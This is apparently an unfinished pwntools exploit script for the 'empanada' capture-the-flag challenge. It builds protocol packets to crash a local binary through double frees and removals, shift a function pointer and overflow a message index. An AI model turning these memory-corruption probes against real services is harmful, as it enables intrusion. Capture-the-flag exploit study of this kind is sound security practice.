#!/usr/bin/env python2
"""
header (from hbw)

char pmsg_hdr
+-------+-------+-------+-------+-------+-------+-------+-------+
|   8   |   7   |   6   |   5   |   4   |   3   |   2   |   1   |
+-------+---------------+---------------------------------------+
| mtype |      idx      |                  size                 |
+-------+---------------+---------------------------------------+

empanada_45e50f0410494ec9cfb90430d2e86287.quals.shallweplayaga.me:47281

"""
from pwn import *

# constants
MAX_RESPONSE_SIZE = 93

# message types
MTYPE_SRV = 0x0
MTYPE_CLI = 0x1

# commands
CMD_STORE_MSG = 0x10
CMD_GET_HSUM = 0x20
CMD_GET_MSG = 0x30
CMD_MSG_COUNT = 0x40
CMD_RM_MSG = 0x50
CMD_GET_ALL = 0x60
CMD_CLR_INVDMSG = 0xfe

def generate_header(mtype, idx, size):
    # truncate size to 5 bits
    size = size & 0x1f

    # start by setting header equal to size (truncated to 5 bits)
    hdr = size

    # truncate idx range 0-3
    idx = idx & 0x03

    # set index in position
    hdr |= (idx << 5);

    # set client message bit
    if mtype == MTYPE_CLI:
        hdr |= 0x80
    else:
        hdr &= 0x80

    # pack into 8 bit char
    hdr = p8(hdr)

    return hdr


"""
struct protomsg
{
  msg_type mtype;
  char idx;
  char size;
  union msg_payload payload;
  {
    char cmd;
    char pos;
    char msg[31];
  }
  hsum_fn hsum;
  struct protomsg *prev;
  struct protomsg *next;
};
"""
def generate_payload(cmd, pos, msg):
    # set command
    payload = p8(cmd)
    # set position
    payload += p8(pos)
    # set message
    payload += msg

    return payload


def generate_packet(mtype, cmd, idx, pos, msg, size=None):
    # generate payload
    payload = generate_payload(cmd, pos, msg)

    if size is None:
        size = len(payload)

    # generate header
    hdr = generate_header(mtype, idx, size)

    # construct packet
    packet = hdr + payload

    return packet


def generate_packet_chain(mtype, cmd, idx, pos, msg, size=None):
    packet = generate_packet(mtype, cmd, idx, pos, msg[:31], 31)
    # TODO: chunk and offset message
    packet += generate_packet(mtype, cmd, idx-1, pos-1, msg[31:], 31)
    return packet


def send_messages(p, packets):
    for packet in packets:
        # send packet
        p.send(packet)

        # listen for response
        response = p.recv(MAX_RESPONSE_SIZE)

        # display response
        print response


"""
adding 2 messages and removing both segfaults
"""
def removal_all_crash_packets(): 
    return [
        generate_packet(MTYPE_CLI, CMD_STORE_MSG, 0, 0, 'A' * 3),
        generate_packet(MTYPE_CLI, CMD_STORE_MSG, 0, 1, 'B' * 3),
        generate_packet(MTYPE_CLI, CMD_RM_MSG, 0, 0, ''),
        generate_packet(MTYPE_CLI, CMD_RM_MSG, 0, 1, '')
    ]

# removing the same message twice segfaults
def double_remove_crash_packets():
    return [
        generate_packet(MTYPE_CLI, CMD_STORE_MSG, 0, 0, 'A' * 3),
        generate_packet(MTYPE_CLI, CMD_RM_MSG, 0, 0, ''),
        generate_packet(MTYPE_CLI, CMD_RM_MSG, 0, 0, '')
    ]

"""
offset moves hsum pointer, must be > 0

pos also moves hsum pointer
offset = 1, pos = 0, hsum_pointer = 825458326/0x31337ed2
offset = 2, pos = 0, hsum_pointer = 825458266/0x31337e5a
offset = 2, pos = 1, hsum_pointer = 825458326/0x31337ed2
offset = 3, pos = 0, hsum_pointer = 825458206/0x31337e1e
...
offset = 10, pos = 0, hsum_pointer = 825457786/0x31337c7a
...
offset = 10, pos = 9, hsum_pointer = 825458326/0x31337ed2

no collisions :/

"""
def move_hsum_pointer(moves, offset):
    move_hsum_pointer = [
        generate_packet(MTYPE_CLI, CMD_STORE_MSG, 0, 0, 'a' * 3)
            for i in range(moves)
    ]

    move_hsum_pointer += [
        generate_packet(MTYPE_CLI, CMD_RM_MSG, 0, 0, '')
            for i in range(moves-offset)
    ]

    pos = offset-1
    move_hsum_pointer += [
        generate_packet(MTYPE_CLI, CMD_GET_HSUM, 0, pos, ''),
        generate_packet(MTYPE_CLI, CMD_CLR_INVDMSG, 0, 0, '')
    ]

    return move_hsum_pointer


"""
send `count` messages and then get them all back
"""
def get_all_messages(count):
    messages = [
        generate_packet(MTYPE_CLI, CMD_STORE_MSG, 0, 0, 'a' * 3)
            for i in range(count)
    ]

    messages += [
        generate_packet(MTYPE_CLI, CMD_GET_ALL, 0, 0, '')
    ]

    return messages

def big_msg_index():
    idx = 1;
    return [
        generate_packet(MTYPE_CLI, CMD_STORE_MSG, idx, 0, 'a' * 255),
        generate_packet(MTYPE_CLI, CMD_GET_HSUM, 0, 0, ''),
        generate_packet(MTYPE_CLI, CMD_CLR_INVDMSG, 0, 0, ''),
        generate_packet(MTYPE_CLI, CMD_GET_MSG, 0, 0, ''),
    ]


def big_msg_index2():
    idx = 1;
    return [
        generate_packet(MTYPE_CLI, CMD_STORE_MSG, idx, 1, 'a' * 61),
        generate_packet(MTYPE_CLI, CMD_GET_HSUM, 0, 0, ''),
        generate_packet(MTYPE_CLI, CMD_CLR_INVDMSG, 0, 0, ''),
        generate_packet(MTYPE_CLI, CMD_GET_MSG, 0, 0, '')
    ]


def big_msg_index3():
    idx = 1;
    return [
        generate_packet(MTYPE_CLI, CMD_STORE_MSG, idx, 1, 'a' * 61),
        #generate_packet(MTYPE_CLI, CMD_GET_HSUM, 0, 0, ''),
        generate_packet(MTYPE_CLI, CMD_CLR_INVDMSG, 0, 0, ''),
        generate_packet(MTYPE_CLI, CMD_GET_MSG, idx, 0, 'a' * 61)
    ]


def big_msg_index4():
    idx = 1;
    return [
        generate_packet_chain(MTYPE_CLI, CMD_STORE_MSG, idx, 1, 'a' * 255, 255),
        generate_packet(MTYPE_CLI, CMD_GET_HSUM, 0, 0, ''),
        generate_packet(MTYPE_CLI, CMD_CLR_INVDMSG, 0, 0, ''),
        generate_packet(MTYPE_CLI, CMD_GET_MSG, 0, 0, '')
    ]
    

def main():
    # start server
    p = process('./empanada')

    # generate packets
    packets = \
        big_msg_index4()
        #big_msg_index3()
        #big_msg_index2()
        #big_msg_index()
        #get_all_messages(0)
        #removal_all_crash_packets()
        #double_remove_crash_packets()
        #move_hsum_pointer(63, 1)

    # send packet and read response
    send_messages(p, packets)


if __name__ ==  "__main__":
    main()
